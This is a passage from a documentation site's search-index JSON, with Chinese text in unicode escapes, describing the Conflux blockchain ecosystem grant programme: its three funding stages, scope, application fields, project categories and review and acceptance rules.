start\u4e00\u4e9b\u5728\u672a\u6765\u80fd\u591f\u771f\u6b63\u88ab\u7528\u6237\u4f7f\u7528\u7684\u4ea7\u54c1\uff0c\u88ab\u7528\u6237\u63a5\u7eb3\u4ece\u800c\u81ea\u5df1\u9020\u8840\uff0c\u800c\u975e\u5355\u7eaf\u7684\u52b3\u52a1\u5916\u5305\u3002\u6240\u4ee5\uff0c\u6bcf\u9636\u6bb5\u7533\u8bf7\u548c\u9a8c\u6536\u65f6\uff0c\u9879\u76ee\u65b9\u521b\u4e1a\u56e2\u961f\u90fd\u9700\u8981\u6e05\u695a\u81ea\u5df1\u63a5\u4e0b\u6765\u7684\u76ee\u6807\u4efb\u52a1\u548c\u8ba1\u5212\u3002 \u65b0\u56e2\u961f\u52a0\u5165Conflux\uff0c\u4e0d\u7ba1\u662f\u8fc1\u79fb\u6210\u719f\u9879\u76ee\u4e0a\u94fe\u3001\u5728Conflux\u4e0a\u5b75\u5316\u8fd8\u662f\u60f3\u8ddf\u793e\u533a\u4e00\u8d77\u505a\u9879\u76ee\uff0c\u90fd\u53ef\u4ee5\u5411Conflux\u7533\u8bf7\u6276\u6301\u3002\u9664\u7ecf\u6d4e\u6fc0\u52b1\u5916\uff0cConflux\u751f\u6001\u6276\u6301\u9879\u76ee\u8fd8\u53ef\u4ee5\u83b7\u5f97\u4ee5\u4e0b\u670d\u52a1\uff1a \u5e02\u573a\u670d\u52a1 \u56fd\u5185\u5ba3\u53d1\uff1a\u6587\u7ae0\u3001\u91cd\u8981\u4e8b\u4ef6\u3001\u65f6\u95f4\u8282\u70b9 \u7ebf\u4e0a\u6d3b\u52a8\u5bf9\u63a5\uff1aAMA\u3001\u76f4\u64ad\u7b49 \u7ebf\u4e0b\u6d3b\u52a8\uff08\u6280\u672f\u6c99\u9f99\uff0c\u4e13\u9898\u6c99\u9f99\uff0c\u5927\u578b\u5cf0\u4f1a\uff09\u5bf9\u63a5 \u6280\u672f\u793e\u533a\u6d4b\u8bd5\u5c0f\u7ec4Beta Test \u4e2d\u56fd\u793e\u533a\uff1aConflux\u793e\u533a/\u5408\u4f5c\u4f19\u4f34/KOL\u793e\u533aAMA\uff0c\u76f4\u64ad\u7b49\u7ebf\u4e0a\u5ba3\u53d1 \u56e2\u961f\u642d\u5efa\uff1a\u793e\u533a\u5927\u4f7f/\u7ba1\u7406\u5458\uff0c\u524d\u540e\u7aef\u5de5\u7a0b\u5e08\u7b49\u4eba\u9009\u63a8\u8350 Conflux\u751f\u6001\u9879\u76ee\u8054\u52a8 Conflux\u4e2d\u56fd\u884c \u529e\u516c\u573a\u5730 \u6d77\u5916PR\uff1a\u6838\u5fc3\u5185\u5bb9\u591a\u8bed\u8a00\u7ffb\u8bd1\u3001\u5ba3\u53d1 \u6d77\u5916\u793e\u533a\uff1aConflux\u793e\u533a\u53ca\u5408\u4f5c\u4f19\u4f34\u793e\u533aAMA\u7b49\u7ebf\u4e0a\u6d3b\u52a8 \u6d77\u5916\u793e\u533a\uff1a0-1\u793e\u533a\u642d\u5efa \u57fa\u7840\u670d\u52a1 BTC/ETH/HECO/BSC/OKEX \u8d44\u4ea7\u8de8\u94fe\u6280\u672f\u652f\u6301 \u4fe1\u606f\u670d\u52a1 Conflux Scan \u667a\u80fd\u5408\u7ea6\u4fe1\u606f\u6ce8\u518c\uff0c\u8d44\u4ea7\u4fe1\u606f\u6ce8\u518c \u4e0a\u67b6 DAppBirds dApp \u5546\u5e97\uff0c\u9996\u9875\u63a8\u8350 \u767b\u9646 Conflux \u5b98\u7f51\u7684\u751f\u6001\u9875\u9762 \u8865\u8d34\u653f\u7b56 Conflux \u4e0a\u6240\u6709\u667a\u80fd\u5408\u7ea6\u4ee3\u4ed8\u8865\u8d34","title":"\u4e00\u3001Conflux\u751f\u6001\u6fc0\u52b1\u8ba1\u5212"},{"location":"development/incentive-guide/#conflux_1","text":"Conflux\u751f\u6001\u9879\u76ee\u6fc0\u52b1\u5171\u5206\u4e3a3\u9636\u6bb5\uff0c\u5206\u522b\u4e3a L1\u9636\u6bb5\uff08\u6700\u9ad8\u6fc0\u52b115K USDT\uff09\u3001L2\u9636\u6bb5\uff08\u9ad8\u8fbe50K USDT)\u3001L3\u9636\u6bb5\uff08\u9ad8\u8fbe100K USDT\uff09 \u3002 \u5728L1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u5373\u53ef\u8fdb\u5165L2\u9636\u6bb5\u3002 \u5728L1\u3001L2\u9636\u6bb5\u9a8c\u6536\u5747\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u5373\u53ef\u8fdb\u5165L3\u9636\u6bb5\u3002\u8fdb\u5165L3\u9636\u6bb5\u7684\u56e2\u961f\u5c06\u76f4\u63a5\u4e0eConflux\u516c\u53f8\u5e02\u573a\u3001\u5546\u52a1\u7b49\u90e8\u95e8\u8fdb\u884c\u63a5\u6d3d\uff0c\u7531Conflux\u5b98\u65b9\u76f8\u5173\u4eba\u5458\u786e\u5b9a\u6fc0\u52b1\u65b9\u5f0f\u3001\u91d1\u989d\u4ee5\u53ca\u53d1\u653e\u6761\u4ef6\u3002 \u5305\u542b\u4f46\u4e0d\u9650\u4e8eIDO\u5728\u5185\u7684\u4e00\u5207\u6709\u4e2d\u56fd\u6cd5\u5f8b\u98ce\u9669\u5185\u5bb9\u7684\u9879\u76ee\u8bf7\u76f4\u63a5\u7533\u8bf7\u6d77\u5916Grants\uff0c\u7533\u8bf7\u94fe\u63a5\uff1a https://forum.conflux.fun/c/English/grant-proposals \u3002 \u56e0\u793e\u533a\u4e3b\u8981\u8d1f\u8d23\u5bf9\u9879\u76eeL1\u3001L2\u9636\u6bb5\u8fdb\u884c\u8bc4\u5ba1\u9a8c\u6536\uff0c\u6240\u4ee5\u672c\u89c4\u5219\u5c06\u91cd\u70b9\u5173\u6ce8\u9879\u76eeL1\u3001L2\u9636\u6bb5\u7684\u8bc4\u5ba1\u8981\u6c42","title":"\u4e8c\u3001Conflux\u751f\u6001\u6fc0\u52b1\u9636\u6bb5\u5212\u5206"},{"location":"development/incentive-guide/#_2","text":"\u57fa\u7840\u8bbe\u65bd\uff1a\u5f00\u53d1\u8de8\u94fe\u8d44\u4ea7\u3001\u6570\u636e\u7b49\u57fa\u7840\u8bbe\u65bd\u7ec4\u4ef6\u5de5\u5177 \u4e92\u8054\u4e92\u901a\uff0c\u94fe\u63a5\u5176\u4ed6\u533a\u5757\u94fe\u7f51\u7edc \u8de8\u94fe\u6280\u672f \u9884\u8a00\u673a\u5f00\u53d1\uff0c\u9488\u5bf9\u94fe\u4e0a\u548c\u94fe\u4e0b\u6570\u636e \u5f00\u53d1\u8005\u5de5\u5177\uff0c\u5982\u5206\u6790\u3001\u67e5\u8be2\u7b49 \u901a\u8bc1\u6807\u51c6\uff0c\u5982 NFT\u3001RFT \u548c\u540c\u8d28\u5316\u901a\u8bc1\u7b49\u4ef7\u7269\u7684\u6807\u51c6 \u8eab\u4efd\u9a8c\u8bc1\uff0c\u5982\u94b1\u5305\u3001KYC\u3001\u8bc1\u4e66\u8ba4\u8bc1\u7b49 \u5b89\u5168\u5de5\u5177\uff0c\u5982\u5ba1\u8ba1\u3001\u5bc6\u94a5\u7ba1\u7406\u3001\u6258\u7ba1\u89e3\u51b3\u65b9\u6848\u7b49 \u79fb\u52a8\u7aef\u548c\u6e38\u620f\u5f00\u53d1\u5de5\u5177 \u5e02\u573a\u4fe1\u606f\u805a\u5408\u5de5\u5177 \u96c6\u6210\u94b1\u5305 \u793e\u533a\uff1a\u793e\u533a\u53d1\u5c55\u3001\u7ba1\u7406\u548c\u8fd0\u4f5c \u4ef2\u88c1\u3001DAO\u3001\u6295\u7968\u53ca\u6cbb\u7406 \u6570\u5b57\u8d44\u4ea7\u7ba1\u7406\u901a\u8bc1\u6807\u51c6\u5de5\u5177\uff0c\u5982\u7a33\u5b9a\u5e01\u3001NFT\u3001\u8de8\u94fe\u8d44\u4ea7 \u52a0\u5bc6\u7ecf\u6d4e\u5b66\u5e94\u7528\u4ea7\u54c1\u7684\u5b9a\u4ef7\u3001\u76d1\u7ba1\u3001\u8d28\u62bc\u7b49 \u53c2\u4e0e\u5e76\u652f\u6301\u793e\u533a\u53d1\u5c55 DApp \u751f\u6001\uff1a\u63d0\u9ad8 Conflux \u7f51\u7edc\u4e2d DApp \u7684\u7528\u6237\u4f7f\u7528\u7387\u3001\u6d41\u52a8\u6027\u548c\u53ef\u7ec4\u5408\u6027 DeFi \u751f\u6001\uff1a\u5982\u7a33\u5b9a\u5e01\u3001\u8de8\u94fe\u8d44\u4ea7\u3001\u652f\u4ed8\u6e20\u9053\u3001\u501f\u8d37\u5e73\u53f0\u3001\u5408\u6210\u8d44\u4ea7\uff08\u884d\u751f\u54c1\u3001\u671f\u6743\uff09\u3001DEX \u3001\u505a\u5e02\u5546\u7b49 \u901a\u8bc1\u9879\u76ee\uff0c\u5982\u975e\u7f8e\u5143\u7a33\u5b9a\u5e01\u3001\u8de8\u94fe BTC\u3001ETH \u53ca\u83b7\u9ec4\u91d1\u6258\u7ba1\u4eba\u80cc\u4e66\u7684\u901a\u8bc1 \u5171\u540c\u521b\u5efa NFT \u4e16\u754c\uff0c\u5982\u6e38\u620f\u3001\u827a\u672f\u3001\u6536\u85cf\u54c1\u3001\u97f3\u4e50\u3001\u4e00\u5207\u5929\u9a6c\u884c\u7a7a\u7684\u521b\u610f \u91cd\u65b0\u90e8\u7f72\uff1a\u5c06\u8d44\u4ea7\u8fc1\u79fb\u81f3 Conflux \u7f51\u7edc \u4e3a\u6d4b\u8bd5\u7f51\u53ca\u4e3b\u7f51\u90e8\u7f72\u8fdb\u884c\u6280\u672f\u6574\u5408 \u4fc3\u8fdb\u8de8\u793e\u533a\u5408\u4f5c \u4e3a\u8d44\u4ea7\u8fc1\u79fb\u63d0\u4f9b\u6d41\u52a8\u6027","title":"\u4e09\u3001\u6fc0\u52b1\u8303\u56f4"},{"location":"development/incentive-guide/#_3","text":"\u5728Conflux\u94fe\u4e0a\u5f00\u53d1\u751f\u6001\u9879\u76ee\u7533\u8bf7\u6d41\u7a0b\u5982\u4e0b\uff1a 1\u3001L1\u9636\u6bb5 \u9879\u76ee\u65b9\u9700\u51c6\u5907\u9879\u76ee\u540d\u79f0\u3001\u9879\u76ee\u4ecb\u7ecd\u3001\u5b9e\u73b0\u76ee\u6807\u3001\u65f6\u95f4\u8282\u70b9\u3001\u9879\u76ee\u6210\u679c\u3001\u9879\u76ee\u8fdb\u5ea6\u8ba1\u5212\u3001\u534f\u4f5c\u4eba\u3001\u7533\u8bf7\u4eba\u3001\u56e2\u961f\u80cc\u666f\u3001\u7533\u8bf7\u65f6\u95f4\u3001\u7ecf\u8d39\u660e\u7ec6\u3001\u662f\u5426\u5f00\u6e90\u3001\u6536\u6b3e\u94b1\u5305\u5730\u5740\u3001\u5907\u6ce8\u3001\u8d44\u6599\u94fe\u63a5\u3001\u4ea7\u54c1\u94fe\u63a5\u3001\u9879\u76ee\u7075\u611f\u6765\u6e90\u3001L1\u9636\u6bb5\u9a8c\u6536\u6807\u51c6\u7b49\u8d44\u6599\u3002\u4e4b\u540e\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5e76\u5728\u6b64Conflux\u8bba\u575b\u751f\u6001\u9879\u76ee\u677f\u5757\u4e2d\u53d1\u5e16\u8fdb\u884c\u9879\u76ee\u8d44\u6599\u516c\u793a\u3002\u751f\u6001\u9879\u76ee\u677f\u5757\u5730\u5740\uff1a https://forum.conflux.fun/c/Chinese/Ecology \u3002 2\u3001L2\u9636\u6bb5 \u9879\u76eeLI\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u65b9\u8bbe\u5b9a\u5173\u952e\u6307\u6807\uff0c\u4e4b\u540e\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u8fdb\u884c\u8bc4\u5ba1\uff0c\u516c\u793a\u5468\u671f\u6ee1\u8db37\u65e5\uff0c\u8bc4\u5ba1\u5c0f\u7ec4\u5373\u5b89\u6392\u8fdb\u884c\u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u3002","title":"\u56db\u3001\u751f\u6001\u7533\u8bf7\u6d41\u7a0b"},{"location":"development/incentive-guide/#_4","text":"\u751f\u6001\u9879\u76ee\u677f\u5757\u5730\u5740\uff1a https://forum.conflux.fun/c/Chinese/Ecology \u3002 \u9879\u76ee\u4fe1\u606f\u95ee\u5377\u94fe\u63a5\uff1a https://wj.qq.com/s2/8502555/95ca/ \u9879\u76ee\u4fe1\u606f\u95ee\u5377\u4e8c\u7ef4\u7801\uff1a \u516c\u793a\u5468\u671f\u6ee1\u8db37\u65e5\uff0c\u8bc4\u5ba1\u5c0f\u7ec4\u5373\u5b89\u6392\u8fdb\u884c\u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u3002","title":"\u7b2c\u4e00\u6b21\u7533\u8bf7\u751f\u6001\u6fc0\u52b1\u65f6\u9700\u8981\u5c06\u9879\u76ee\u4fe1\u606f\u3001\u8054\u7cfb\u65b9\u5f0f\u586b\u5199\u81f3\u95ee\u5377\u4e2d\uff0c\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u4f1a\u4e0e\u60a8\u53d6\u5f97\u8054\u7cfb\u3002(\u975e\u5e38\u91cd\u8981)"},{"location":"development/incentive-guide/#41","text":"\uff081\uff09\u9879\u76ee\u540d\u79f0\uff1b \uff082\uff09\u9879\u76ee\u7c7b\u578b\uff08\u5546\u4e1a\u76c8\u5229\u7c7b\u8fd8\u662f\u7814\u7a76\u63a2\u7d22\u7c7b\uff09\uff1b \uff083\uff09\u9879\u76ee\u4ecb\u7ecd\uff1a \uff084\uff09\u5b9e\u73b0\u6210\u679c\uff1a\uff08\u5f53\u524d\u7533\u8bf7\u5185\u5bb9\u6240\u9700\u8981\u5b8c\u6210\u7684\u5185\u5bb9\uff09 \uff085\uff09\u8fdc\u671f\u76ee\u6807\uff1a\uff08\u9879\u76ee\u540e\u671f\u53d1\u5c55\u65b9\u5411\uff0c\u5e95\u5c42\u5efa\u8bbe\u7684\u9879\u76ee\u8bf4\u660e\u4e00\u4e0b\u4ea7\u751f\u4f5c\u7528\u7684\u9886\u57df\u4ee5\u53ca\u65b9\u5411\uff09 \uff086\uff09\u9879\u76ee\u8fdb\u5ea6\u8ba1\u5212:\uff08\u5217\u540d\u8fdb\u5ea6\u5b89\u6392\u4e0e\u65f6\u95f4\u8282\u70b9\uff09 \uff087\uff09\u7533\u8bf7\u4eba\uff1a \uff088\uff09\u7533\u8bf7\u65f6\u95f4\uff1a \uff089\uff09\u56e2\u961f\u80cc\u666f\uff1a \uff0810\uff09\u56e2\u961f\u6784\u6210\u4e0e\u5206\u5de5\uff08\u6ce8\u660e\u5168\u804c/\u517c\u804c\uff09\uff1a \uff0811\uff09\u7ecf\u8d39\u660e\u7ec6\uff1a \uff0812\uff09\u662f\u5426\u5f00\u6e90\uff1a\uff08\u5b8c\u5168\u5f00\u6e90\u3001\u667a\u80fd\u5408\u7ea6\u90e8\u5206\u5f00\u6e90\uff09 \uff0813\uff09\u8d44\u6599\u94fe\u63a5\uff1a(\u5982\u6709) \uff0814\uff09\u4ea7\u54c1\u94fe\u63a5\uff1a(\u5982\u6709) \uff0815\uff09\u9879\u76ee\u7075\u611f\u6765\u6e90\uff1a \uff0816\uff09\u5176\u4ed6\u9700\u8981\u8bf4\u660e\u7684\u60c5\u51b5\uff1a\uff08\u9879\u76ee\u76f8\u5173\u79d1\u666e\u8d44\u6599\uff09 \uff0817\uff09\u9879\u76ee\u7684\u7cbe\u76ca\u753b\u5e03\uff08\u5546\u4e1a\u76c8\u5229\u7c7b\u9879\u76ee\u5fc5\u586b\uff0c\u6a21\u677f\u3001\u586b\u5199\u65b9\u6cd5\u89c1\u9644\u5f55\uff09\u3002 \uff0818\uff09\u5708\u5916\u5f15\u6d41\u7684\u8fd0\u8425\u65b9\u6848\u3002 \uff0819\uff09 \u9a8c\u6536\u6307\u6807","title":"4.1 \u9879\u76ee\u7533\u8bf7\u5e16\u5fc5\u586b\u5185\u5bb9"},{"location":"development/incentive-guide/#42","text":"1\u3001\u4e00\u4e2a\u751f\u6001\u9879\u76eeL1\u9636\u6bb5\u7533\u8bf7\u7684\u6fc0\u52b1\u4e0a\u9650\u4e3a 1.5W USDT \uff08\u7b49\u503cFC\u548cCFX1:1\u53d1\u653e)\uff0c \u9879\u76ee\u65b9\u8d1f\u8d23\u4eba\u5728\u53d1\u5e03\u7533\u8bf7\u8d34\u540e\u9700\u4e3b\u52a8\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\uff0c\u4ee5\u4fbf\u540e\u7eed\u6c9f\u901a\u3002 2\u3001\u4e00\u4e2a\u751f\u6001\u9879\u76eeL2\u9636\u6bb5\u7533\u8bf7\u7684\u6fc0\u52b1\u4e0a\u9650\u4e3a 5W USDT \uff08\u7b49\u503cFC\u548cCFX1:1\u53d1\u653e)\uff0c\u9879\u76ee\u65b9\u8d1f\u8d23\u4eba\u5728L1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\uff0c\u9700\u4e3b\u52a8\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\uff0c\u4ee5\u4fbf\u540e\u7eed\u6c9f\u901a\u3002 3\u3001\u7533\u8bf7\u901a\u8fc7\u7684\u9879\u76ee\u56e2\u961f\uff0c\u9700\u9636\u6bb5\u6027\u66f4\u65b0\u9879\u76ee\u8fdb\u5ea6\u5230\u5bf9\u5e94\u7684\u751f\u6001\u9879\u76ee\u5e16\u5b50\u5185\u3002 4\u3001\u7533\u8bf7\u901a\u8fc7\u7684\u9879\u76ee\u56e2\u961f\u7533\u8bf7\u4eba\uff0c\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u8fdb\u5165\u751f\u6001\u9879\u76ee\u5efa\u8bbe\u7fa4\uff0c\u4fbf\u4e8e\u8d44\u6e90\u534f\u8c03\u4e0e\u6c9f\u901a\u3002 5\u3001\u6e38\u620f\u578b\u9879\u76ee\u9700\u4e86\u89e3\u5176\u7ecf\u6d4e\u6a21\u5f0f\u3001\u6e38\u620f\u89c4\u5219\u3001\u673a\u5236\u7b49\uff0c\u5e76\u4e14\u8981\u6ce8\u660e\u8be6\u7ec6\u7684\u53d1\u5e03\u9636\u6bb5\u3002","title":"4.2 \u9879\u76ee\u987b\u77e5"},{"location":"development/incentive-guide/#43","text":"","title":"4.3 \u9879\u76ee\u5206\u7c7b\u6807\u51c6"},{"location":"development/incentive-guide/#_5","text":"\u6b64\u7c7b\u9879\u76ee\uff0c\u4ee5\u5546\u4e1a\u76c8\u5229\u4e3a\u76ee\u7684\uff0c\u7528\u6237\u91cf\u3001\u9501\u4ed3\u91cf\u3001\u4ea4\u6613\u91cf\u7b49\u6307\u6807\u53ef\u4ee5\u53cd\u6620\u9879\u76ee\u8fd0\u8425\u72b6\u51b5\uff0c\u6b64\u7c7b\u9879\u76ee\u4e00\u822c\u60c5\u51b5\u4e0b\u6280\u672f\u521b\u65b0\u8f83\u5c11\uff0c\u4f46\u4f1a\u5e26\u6765\u8f83\u591a\u751f\u6001\u6536\u76ca\uff0c\u6e38\u620f\u3001defi\u4ea7\u54c1\u90fd\u5728\u6b64\u7c7b\u3002\u7533\u8bf7\u6b64\u7c7b\u9879\u76ee\u9700\u8981\u5728\u7533\u8bf7\u516c\u793a\u5e16\u4e2d\u63d0\u4f9b\u9879\u76ee\u7684\u7cbe\u76ca\u753b\u5e03\uff08\u6a21\u677f\u548c\u586b\u5199\u65b9\u6cd5\u89c1\u9644\u5f55\uff09\u3002","title":"\uff08\u4e00\uff09\u5546\u4e1a\u76c8\u5229\u7c7b\u9879\u76ee\uff08\u6a2a\u5411\uff09"},{"location":"development/incentive-guide/#_6","text":"\u6e38\u620f\u7c7b\u9879\u76ee\u4e3e\u4f8b\uff1a \u7f16\u53f7032 Dragon Master\uff08NFT\u8d44\u4ea7Dapp\u6e38\u620f\uff09 defi\u7c7b\u9879\u76ee\u4e3e\u4f8b\uff1a \u7f16\u53f7015 \u53bb\u4e2d\u5fc3\u5316CDS\u4fdd\u9669\uff08Ins3\uff09 \u7f16\u53f7051 Conflux PoolTogether nft\u5e73\u53f0\uff1a \u7f16\u53f7060 \u5b8c\u5168\u5e03\u5c40\u5728CONFLUX\u751f\u6001\u4e0a\u7684CRYPTO ART\u5e73\u53f0\u2014DIONYSOS \u7f16\u53f7005-007 tspace","title":"\u9879\u76ee\u4e3e\u4f8b"},{"location":"development/incentive-guide/#_7","text":"\u6b64\u7c7b\u9879\u76ee\u66f4\u503e\u5411\u4e8e\u7814\u7a76\u63a2\u7d22\u3001\u57fa\u7840\u8bbe\u65bd\u5efa\u8bbe\uff0c\u77ed\u671f\u5185\u4ea7\u751f\u8d62\u5229\u53ef\u80fd\u6027\u8f83\u4f4e\uff0c\u4f46\u662f\u6280\u672f\u5f00\u6e90\u53ef\u4ee5\u4e3a\u793e\u533a\u5e7f\u5927\u5f00\u53d1\u8005\u63d0\u4f9b\u4fbf\u5229\u3002\u5bf9\u4e8e\u67d0\u4e9b\u5fae\u5c0f\u9886\u57df\u7684\u63a2\u7d22\u4e5f\u4f1a\u6fc0\u8d77\u6574\u4e2a\u6280\u672f\u793e\u533a\u7684\u521b\u65b0\u63a2\u7d22\u6c1b\u56f4\u3001\u5f15\u53d1\u6280\u672f\u793e\u533a\u6210\u5458\u8fdb\u884c\u6c9f\u901a\u4ea4\u6d41\uff0c\u6240\u4ee5\u7533\u8bf7\u6b64\u7c7b\u9879\u76ee\u9700\u8981\u5b8c\u5168\u5f00\u6e90\uff0c\u7533\u8bf7\u3001\u8bc4\u5ba1\u65f6\u9700\u8981\u63d0\u4f9b\u66f4\u4e30\u5bcc\u7684\u6280\u672f\u7ec6\u8282\u3002","title":"\uff08\u4e8c\uff09\u7814\u7a76\u63a2\u7d22\u7c7b\u9879\u76ee\uff08\u7eb5\u5411\uff09"},{"location":"development/incentive-guide/#_8","text":"\u7f16\u53f7064 \u57fa\u4e8eConflux\u7684\u53bb\u4e2d\u5fc3\u5316\u52a0\u5bc6\u90ae\u4ef6\u7cfb\u7edf \u7f16\u53f7001 .Net Core SDK \u7f16\u53f7042 \u300aMoonGaming\u300bSDK \u7f16\u53f7033 \u6c47\u6d41BPM (Conflux BPM)\uff0c \u4e00\u4e2a\u652f\u6301\u533a\u5757\u94fe\u7684\u4f4e\u4ee3\u7801\u5feb\u901f\u5f00\u53d1\u5e73\u53f0","title":"\u9879\u76ee\u4e3e\u4f8b"},{"location":"development/incentive-guide/#44","text":"1\u3001L1\u9636\u6bb5\u4ee5\u9879\u76ee\u8bc4\u5ba1\u4e3a\u4e3b \u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5230\u4f4d7\u540d\u53ca\u4ee5\u4e0a \u6bcf\u9879\u751f\u6001\u9879\u76ee\u6295\u7968\u4e0d\u5f97\u4f4e\u4e8e\u534a\u6570 2\u3001L2\u9636\u6bb5\u4ee5\u5173\u952e\u6307\u6807\u8bbe\u5b9a\u4e3a\u4e3b \u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5230\u4f4d7\u540d\u53ca\u4ee5\u4e0a\u3002 \u6bcf\u9879\u751f\u6001\u9879\u76ee\u6295\u7968\u4e0d\u5f97\u4f4e\u4e8e\u534a\u6570\u3002 \u5404\u9879\u5173\u952e\u6307\u6807\uff0c\u53bb\u6389\u6700\u9ad8\u503c\u548c\u6700\u4f4e\u503c\uff0c\u53d6\u5e73\u5747\u503c\u3002","title":"4.4 \u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u6807\u51c6"},{"location":"development/incentive-guide/#45","text":"\u5317\u4eac\u65f6\u95f4\u6bcf\u5468\u65e5\u4e0b\u53482\u70b930\u5206\u3002\uff08\u65e0\u9879\u76ee\u6216\u7279\u6b8a\u60c5\u51b5\u4e0d\u4e3e\u884c\uff09\u3002\u9879\u76ee\u586b\u5199\u516c\u793a\u4e4b\u540e\uff0c\u8bf7\u53ca\u65f6\u901a\u77e5\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\uff0c\u4ee5\u53ca\u9700\u8981\u5728\u5e16\u5b50\u4e2d\u56de\u7b54\u793e\u533a\u6210\u5458\u7684\u5404\u79cd\u95ee\u7b54\u3002","title":"4.5 \u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u65f6\u95f4"},{"location":"development/incentive-guide/#46","text":"\u751f\u6001\u9879\u9879\u76ee\u53d8\u66f4\u91c7\u7528\u4e00\u4e8b\u4e00\u8bae\uff0c\u9879\u76ee\u65b9\u628a\u9700\u8981\u53d8\u66f4\u7684\u90e8\u5206\u8fdb\u884c\u8bf4\u660e\uff0c\u5e76\u9884\u4f30\u5f71\u5f71\u54cd\uff0c\u5c06\u8be6\u7ec6\u4fe1\u606f\u53d1\u5e03\u5230\u7533\u8bf7\u8d34\u4e2d\uff0c\u7531\u8bc4\u5ba1\u5c0f\u7ec4\u6295\u7968\u51b3\u5b9a\u662f\u5426\u901a\u8fc7\u53d8\u66f4\u5e76\u5728\u7533\u8bf7\u8d34\u4e2d\u56de\u590d\u6295\u7968\u7ed3\u679c\u3002 \u9879\u76ee\u65b9\u5728\u7533\u8bf7\u53d8\u66f4\u65f6\u4f1a\u586b\u5185\u5bb9\u9700\u8981\u5305\u62ec\uff1a \u2022 \u53d8\u66f4\u63cf\u8ff0\uff08\u5177\u4f53\u54ea\u4e9b\u9879\u76ee\u8fdb\u884c\u5982\u4f55\u7684\u53d8\u66f4\uff09 \u2022 \u53d8\u66f4\u539f\u56e0 \u2022 \u53d8\u66f4\u5229\u76ca \u2022 \u53d8\u66f4\u6210\u672c \u2022 \u53d8\u66f4\u5e26\u6765\u7684\u5f71\u54cd \u2022 \u652f\u6301\u6027\u6587\u4ef6\uff08\u9009\u586b\uff09","title":"4.6 \u751f\u6001\u9879\u76ee\u53d8\u66f4"},{"location":"development/incentive-guide/#47","text":"\u9879\u76ee\u5b8c\u7ed3\u6216\u9636\u6bb5\u6027\u5b8c\u7ed3\uff0c\u9879\u76ee\u7533\u8bf7\u4eba\u53ef\u56de\u5e16\u7533\u8bf7\u9a8c\u6536\uff0c\u5e76\u901a\u77e5\u9a8c\u6536\u5c0f\u7ec4\u3002 \u9a8c\u6536\u7533\u8bf7\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a \u2022 \u4e3b\u8981\u5de5\u4f5c\u5b8c\u6210\u60c5\u51b5 \u2022 \u5173\u952e\u6280\u672f\u6307\u6807\u6ee1\u8db3\u60c5\u51b5 \u2022 \u6210\u679c\u5b9e\u73b0\u60c5\u51b5 \u2022 \u7ecf\u8d39\u4f7f\u7528\u60c5\u51b5 \u2022 \u6280\u672f\u6d4b\u8bd5\u60c5\u51b5 \u2022 \u8d44\u6599\u5ba1\u67e5\u60c5\u51b5 \u4e00\u4e9b\u9879\u76ee\u9700\u63d0\u4ea4\u6e90\u4ee3\u7801\u94fe\u63a5\uff0c\u9879\u76ee\u6587\u6863\u7b49\u76f8\u5173\u8d44\u6599\u6253\u5305\u3002 \u9a8c\u6536\u7533\u8bf7\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a\u4e3b\u8981\u5de5\u4f5c\u5b8c\u6210\u60c5\u51b5\u3001\u5173\u952e\u6280\u672f\u6307\u6807\u6ee1\u8db3\u60c5\u51b5\u3001\u6210\u679c\u5b9e\u73b0\u60c5\u51b5\u3001\u7ecf\u8d39\u4f7f\u7528\u60c5\u51b5\u3001\u6280\u672f\u6d4b\u8bd5\u60c5\u51b5\u3001\u8d44\u6599\u5ba1\u67e5\u60c5\u51b5\u7b49\u3002\u9a8c\u6536\u5c0f\u7ec4\u5c06\u7ec4\u7ec7\u6d4b\u8bd5\u4eba\u5458\u8fdb\u884c\u6d4b\u8bd5\u9a8c\u6536\u6253\u5206\uff0c\u5e76\u6839\u636e\u9879\u76ee\u9a8c\u6536\u60c5\u51b5\u8fdb\u884c\u6253\u5206\u3002 \u9a8c\u6536\u901a\u8fc7\u7684\u9879\u76ee\uff0c\u6280\u672f\u59d4\u5458\u4f1a\u4f1a\u901a\u8fc7\u90ae\u4ef6\u5411Conflux\u57fa\u91d1\u4f1a\u63d0\u4ea4\u300a\u9879\u76ee\u9a8c\u6536\u7ed3\u679c\u300b\uff0c\u5e76\u6284\u9001\u5168\u4f53\u59d4\u5458\u4f1a\u6210\u5458\u3002Conflux\u57fa\u91d1\u4f1a\u5ba1\u6838\u540e\uff0c\u5411\u9879\u76ee\u7533\u8bf7\u4eba\u62e8\u4ed8\u7ecf\u8d39\u3002 \u9879\u76ee\u7533\u8bf7\u4eba\u6536\u5230\u7ecf\u8d39\u540e\uff0c\u56de\u5e16\u5df2\u6536\u5230\u5168\u989d\u7ecf\u8d39\uff0c\u4e8e\u7533\u8bf7\u5e16\u6807\u9898\u8ffd\u52a0\u72b6\u6001\uff08\u5df2\u5b8c\u6210\uff09\u5e76\u544a\u77e5\u6280\u672f\u59d4\u5458\u4f1a\uff0c\u9879\u76ee\u5b8c\u6210\u3002","title":"4.7 